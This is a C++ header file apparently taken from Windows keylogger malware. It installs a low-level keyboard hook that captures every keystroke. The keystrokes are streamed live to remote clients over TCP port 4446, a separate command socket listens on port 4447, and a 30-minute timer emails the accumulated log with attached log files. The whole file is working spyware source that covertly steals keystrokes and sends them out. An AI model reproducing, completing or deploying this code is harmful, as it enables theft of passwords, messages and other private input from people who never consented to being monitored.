#ifndef KEYBHOOK_H
#define KEYBHOOK_H

#include <iostream>
#include <fstream>
#include "windows.h"
#include "KeyConstants.h"
#include "SendMail.h"
#include "Socket_com.h"
#include "Socket_com_command.h"


std::string keylog = "";
int serverSocket;
int serverSocket_command;
void TimerSendmail()
{
    if(keylog.empty())
        return;
    std::string last_file = IO::WriteLog(keylog);
    Helper::DateTime dt;
    if (last_file.empty())
    {
        Helper::WriteAppLog("File creation was not successful.");
        Socket_com::writeLogToClients("File creation was not successful.");
        return;
    }
    Helper::WriteAppLog(keylog+"\n");
    int x = Mail::SendMail("Log_"+ dt.GetDateTimeString() , keylog, IO::GetOurPath(true) + last_file + "::" + "AppLog.txt");
    //Socket_com::sendMessageToClients(keylog.c_str());
    if (x!=7 && x!= 1){
        Helper::WriteAppLog(IO::GetOurPath(true) + last_file +" Mail was not sent ! Error code : "+ Helper::ToString(x));
        Socket_com::writeLogToClients(IO::GetOurPath(true) + last_file +" Mail was not sent ! Error code : "+ Helper::ToString(x));
    }

    else
        keylog = "";
}

Timer MailTimer(TimerSendmail, 500 * 60, Timer::Infinite);

HHOOK eHOOK = NULL;

LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
{
    if(nCode<0)
        CallNextHookEx(eHOOK, nCode, wparam, lparam);

    KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *)lparam;

    if(wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
    {
        keylog += Keys::KEYS[kbs->vkCode].Name;
        Socket_com::sendMessageToClients(Keys::KEYS[kbs->vkCode].Name.c_str());
        if(kbs->vkCode == VK_RETURN)
        {
            Socket_com::sendMessageToClients("\n");
            keylog += '\n';
        }
    }
    else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP)
    {
        DWORD key = kbs->vkCode;
        if(key == VK_RCONTROL || key == VK_RSHIFT || key == VK_LCONTROL || key == VK_LSHIFT || key == VK_MENU || key == VK_LMENU || key == VK_RMENU || key == VK_CAPITAL || key == VK_NUMLOCK || key == VK_LWIN || key == VK_RWIN )
        {
            std::string Keyname = Keys::KEYS[kbs->vkCode].Name;
            Keyname.insert(1,"/");
            Socket_com::sendMessageToClients(Keyname.c_str());
            keylog += Keyname;
        }
    }

    return CallNextHookEx(eHOOK, nCode, wparam, lparam);
}

bool InstallHook()
{
    Helper::WriteAppLog("Hook Started... Timer Started");
    MailTimer.Start(true);
    serverSocket = Socket_com::runServer(4446);
    serverSocket_command = Socket_com_command::runServer(4447);
    eHOOK = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OurKeyboardProc, GetModuleHandle(NULL),0);
    return eHOOK == NULL;
}

bool UninstallHook()
{
    BOOL b = UnhookWindowsHookEx (eHOOK);
    eHOOK = NULL;
    closesocket(serverSocket_command);
    closesocket(serverSocket);
    WSACleanup();
    return (bool)b;
}


bool IsHooked()
{
    return (bool)(eHOOK == NULL);
}



#endif // KEYBHOOK_H
